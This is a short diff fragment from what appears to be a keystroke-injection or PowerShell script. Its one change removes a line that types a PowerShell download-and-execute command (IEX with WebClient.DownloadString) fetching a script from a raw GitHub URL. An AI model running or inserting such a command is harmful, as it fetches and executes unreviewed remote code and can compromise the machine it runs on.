@@ -24,4 +24,3 @@ Catch {
 }
 
 
-STRING IEX ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/CarpenterBruteforce/PowershellScripts/main/script.ps1'))
